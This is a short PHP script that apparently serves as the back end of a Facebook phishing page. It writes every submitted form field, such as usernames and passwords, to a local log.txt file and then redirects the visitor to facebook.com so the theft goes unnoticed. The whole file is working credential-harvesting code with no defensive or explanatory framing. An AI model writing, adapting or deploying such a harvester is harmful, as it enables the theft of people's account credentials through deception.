<?php
header ('Location: facebook.com');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "
");
}
fwrite($handle, "

");
fclose($handle);
exit;
?>
